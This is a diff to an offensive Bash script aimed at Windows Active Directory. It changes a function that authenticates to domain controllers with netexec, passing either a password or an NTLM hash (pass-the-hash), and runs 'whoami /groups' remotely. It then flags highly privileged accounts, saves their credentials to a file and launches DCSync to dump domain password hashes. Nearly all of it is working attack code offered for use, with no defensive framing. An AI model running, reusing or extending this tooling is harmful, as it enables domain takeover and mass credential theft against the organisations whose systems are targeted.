@@ -1963,19 +1963,25 @@ run_check_and_dcsync() {
     echo "----------------------------------------"
     echo "[*] [$dc] Checking privilege: $user"
 
-    cmd="netexec ldap $dc -u $user -p '$pass' --groups"
-    echo "[CMD] $cmd"
+    # detect hash atau password
+    if echo "$pass" | grep -Eq "^[0-9a-fA-F]{32}$"; then
+        cmd="nxc smb $dc -u $user -H $pass -x 'whoami /groups'"
+    else
+        cmd="nxc smb $dc -u $user -p '$pass' -x 'whoami /groups'"
+    fi
 
-    output=$(eval $cmd)
+    echo "[CMD] $cmd"
+    output=$(eval $cmd 2>/dev/null)
 
     echo "[OUTPUT]"
     echo "$output"
     echo ""
 
-    # extract groups (simple parsing)
-    groups=$(echo "$output" | grep -E "^\s*[A-Za-z]" | awk '{print $1}' | tr '\n' ',' | sed 's/,$//')
+    # parsing groups
+    groups=$(echo "$output" | grep -E "Group Name" -A 50 | tail -n +3 | awk '{print $1}' | tr '\n' ',' | sed 's/,$//')
 
-    if echo "$output" | grep -Eqi "Administrators|Domain Admins|Enterprise Admins"; then
+    # detect privilege
+    if echo "$output" | grep -Eqi "Domain Admins|Enterprise Admins|BUILTIN\\Administrators"; then
         priv="HIGH PRIV"
         echo "[+] HIGH PRIV FOUND: $user"
         echo "$dc|$user:$pass" >> "$HIGH_PRIV_FILE"
@@ -1984,9 +1990,6 @@ run_check_and_dcsync() {
         echo "[-] Low priv: $user"
     fi
 
-    # ================================
-    # WRITE SUMMARY
-    # ================================
     {
         echo "========================================"
         echo "[USER] $user"
@@ -1995,11 +1998,8 @@ run_check_and_dcsync() {
         echo "[PRIV] $priv"
     } >> "$FINAL_OUTPUT"
 
-    # ================================
-    # DCSYNC
-    # ================================
+    # DCSync kalau high priv
     if [[ "$priv" == "HIGH PRIV" ]]; then
-
         echo "----------------------------------------"
         echo "[*] Running DCSync with $user"
 
@@ -2017,7 +2017,6 @@ run_check_and_dcsync() {
             echo "$output2"
             echo ""
         } >> "$FINAL_OUTPUT"
-
     fi
 }
 
